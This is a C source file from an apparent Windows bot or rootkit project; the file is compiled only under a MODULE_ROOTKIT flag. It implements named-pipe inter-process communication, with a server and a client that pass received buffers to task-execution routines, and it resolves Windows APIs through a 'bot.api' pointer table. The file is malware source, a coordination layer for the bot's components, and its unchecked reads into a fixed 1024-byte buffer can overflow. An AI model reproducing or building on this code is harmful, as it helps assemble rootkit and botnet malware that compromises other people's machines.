#include "ipc.h"

#ifdef MODULE_ROOTKIT
#include "../common/mem.h"
#include "../common/utils.h"
#include "../common/string.h"

#include "pipes.h"
#include "ipc_tasks.h"

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

extern bot_t bot;

static LPWSTR _GeneratePipeName()
{
	unsigned int iLength;

	wchar_t wzPipeName[256];
	memzero(&wzPipeName, sizeof(wzPipeName));
	if ((iLength = bot.api.pwsprintfW(wzPipeName, L"\\\\.\\pipe\\%x_server", GetSerialNumber())) > 0)
	{
		return StrCopyW(wzPipeName, iLength);
	}

	return NULL;
}

static void _HandleServerData(HANDLE hPipe, LPSTR pszData, DWORD dwLength)
{
	ExecuteIPCServerTask(pszData);
}

static DWORD Pipe_Connection(HANDLE hPipe)
{
	DWORD dwDataAvailable, dwDataRead;
	char szBuffer[1024];

	AddPipeToList(hPipe);

#if defined WDEBUG
	WDEBUG("A pipe was added to the list!");
#endif

	while (TRUE)
	{
		dwDataAvailable = 0;

		if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwDataAvailable, NULL) && dwDataAvailable > 0)
		{
			memzero(&szBuffer, sizeof(szBuffer));

			if (bot.api.pReadFile(hPipe, szBuffer, dwDataAvailable, &dwDataRead, NULL) && dwDataRead > 0)
			{
				_HandleServerData(hPipe, StrCopyA(szBuffer, dwDataRead), dwDataRead);
			}
			else break;
		}

		Utils_Sleep(500);
	}

	RemovePipeFromList(hPipe);

#if defined WDEBUG
	WDEBUG("A pipe was removed from the list!");
#endif

	CWA(FlushFileBuffers)(hPipe);
	CWA(DisconnectNamedPipe)(hPipe);
	CWA(CloseHandle)(hPipe);

	return 0;
}

static DWORD IPC_Server(LPVOID lpArguments)
{
	LPWSTR pwzPipeName;
	HANDLE hPipe, hThread;

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	if ((pwzPipeName = _GeneratePipeName()) == NULL)
	{
#ifdef WDEBUG
		WDEBUG("Failed to generate pipe name.");
#endif
		return 0;
	}

	do
	{
		if ((hPipe = CreateNamedPipeW(
			pwzPipeName,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_MESSAGE |
			PIPE_READMODE_MESSAGE |
			PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			1024,
			1024,
			0,
			NULL)) == INVALID_HANDLE_VALUE)
		{
#ifdef WDEBUG
		WDEBUG("CreateNamedPipeW failed.");
#endif
			Utils_Sleep(1000);
			continue;
		}

		if (ConnectNamedPipe(hPipe, NULL))
		{
			if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pipe_Connection, (LPVOID)hPipe, 0, NULL)) != 0)
			{
#ifdef WDEBUG
				WDEBUG("A new pipe connection has been accepted!");
#endif
				bot.api.pCloseHandle(hThread);
			}
		}

	} while (TRUE);

	memfree(pwzPipeName);


	return 0;
}

BOOL WINAPI RunIPCServer(void)
{
	HANDLE hThread;

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IPC_Server, NULL, 0, NULL)) != 0)
	{
#ifdef WDEBUG
	WDEBUG("Success.");
#endif
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

#ifdef WDEBUG
	WDEBUG("Failed.");
#endif

	return FALSE;
}

static void _HandleClientData(HANDLE hPipe, const LPSTR pszData, DWORD dwLength)
{
	ExecuteIPCClientTask(pszData);
}

static DWORD IPC_Client(LPVOID lpArguments)
{
	HANDLE hPipe;
	LPWSTR pwzPipeName;
	DWORD dwDataAvailable, dwDataRead;
	char szBuffer[1024];

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	if ((pwzPipeName = _GeneratePipeName()) == NULL)
	{
#ifdef WDEBUG
	WDEBUG("Failed to generate pipe name.");
#endif
		return 0;
	}

	while (TRUE)
	{
		if ((hPipe = bot.api.pCreateFileW(
			pwzPipeName,
			GENERIC_READ |
			GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) != INVALID_HANDLE_VALUE)
		{
			AddPipeToList(hPipe);

#ifdef WDEBUG
	WDEBUG("Pipe-client connected to server!");
#endif

			while (TRUE)
			{
				dwDataAvailable = 0;

				if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwDataAvailable, NULL) && dwDataAvailable > 0)
				{
					memzero(&szBuffer, sizeof(szBuffer));

					if (bot.api.pReadFile(hPipe, szBuffer, dwDataAvailable, &dwDataRead, NULL) && dwDataRead > 0)
					{
						_HandleClientData(hPipe, StrCopyA(szBuffer, dwDataRead), dwDataRead);
					}
					else break;
				}

				Utils_Sleep(500);
			}

#ifdef WDEBUG
	WDEBUG("Pipe-client disconnected from server!");
#endif

			RemovePipeFromList(hPipe);
		}

		Utils_Sleep(1000);
	}
	return 0;
}

BOOL WINAPI RunIPCClient(void)
{
	HANDLE hThread;

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	if ((hThread = bot.api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IPC_Client, NULL, 0, NULL)) != 0)
	{
#ifdef WDEBUG
	WDEBUG("Success.");
#endif
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

#ifdef WDEBUG
	WDEBUG("Failed.");
#endif
	return FALSE;
}
#endif